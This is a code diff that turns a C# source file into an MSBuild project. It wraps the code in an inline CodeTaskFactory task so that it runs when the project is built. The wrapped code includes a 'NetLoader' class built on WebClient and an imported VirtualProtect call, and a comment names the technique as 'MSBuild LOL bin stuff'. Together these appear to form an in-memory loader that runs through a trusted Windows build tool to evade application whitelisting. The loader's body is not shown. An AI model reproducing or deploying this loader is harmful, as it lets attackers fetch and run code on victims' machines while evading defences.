@@ -1,4 +1,15 @@
-﻿using System;
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Hello">
+    <ClassExample/>
+  </Target>
+  <UsingTask
+  TaskName="ClassExample"
+  TaskFactory="CodeTaskFactory"
+  AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+     <Task>
+      <Code Type="Class" Language="cs">
+	      <![CDATA[	  
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Net;
@@ -6,8 +17,8 @@ using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
 
 //This if for MSBuild LOL bin stuff later
-//using Microsoft.Build.Framework;
-//using Microsoft.Build.Utilities;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
 public class NetLoader
 {
     static WebClient webClient = new WebClient() { };
@@ -180,8 +191,7 @@ public class WinLibBase
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 }
 
-/*
- //This is for MSBuild later
+
 public class ClassExample : Task, ITask
 {
     public override bool Execute()
@@ -190,4 +200,11 @@ public class ClassExample : Task, ITask
         return true;
     }
 }
-*/
+
+
+
+ ]]>
+	</Code>	  
+    </Task>
+  </UsingTask>
+</Project>
